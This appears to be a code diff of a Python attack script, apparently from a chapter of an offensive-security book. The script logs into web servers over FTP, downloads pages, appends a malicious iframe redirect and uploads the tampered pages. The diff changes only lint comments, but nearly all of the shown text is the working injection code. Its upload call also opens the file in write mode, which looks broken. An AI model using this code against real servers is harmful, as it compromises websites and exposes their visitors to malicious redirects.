@@ -10,18 +10,18 @@ def injectPage(ipftp, ippage, ipredirect):
                  encoding='utf-8-sig')
         ipftp.retrlines('RETR ' + ippage, f.write)
         print('[+] Downloaded Page: ' + ippage)
-    except:  # pylint: disable=bare-except  # noqa: E722
+    except:  # pylint: disable=bare-except
         print('[-] Failed to Download Page: ' + ippage)
         return
     f.write(ipredirect)
     f.close()
     print('[+] Injected Malicious IFrame on: ' + ippage)
     try:
-        ipftp.storlines('STOR ' + ippage, open(ippage + '.tmp',  # pylint: disable=R1732  # noqa: E501
+        ipftp.storlines('STOR ' + ippage, open(ippage + '.tmp',  # pylint: disable=R1732
                                                'w',
-                                               encoding='utf-8-sig'))  # noqa: E501
+                                               encoding='utf-8-sig'))
         print('[+] Uploaded Injected Page: ' + ippage)
-    except:  # pylint: disable=bare-except  # noqa: E722
+    except:  # pylint: disable=bare-except
         print('[-] Failed to Upload Injected Page: ' + ippage)
     return
 
@@ -30,7 +30,7 @@ def returnDefault(ipftp):
     ''' return the default pages for the chapter 2'''
     try:
         dirList = ipftp.nlst()
-    except:  # pylint: disable=bare-except  # noqa: E722
+    except:  # pylint: disable=bare-except
         dirList = []
         print('[-] Could not list directory contents.')
         print('[-] Skipping To Next Target.')
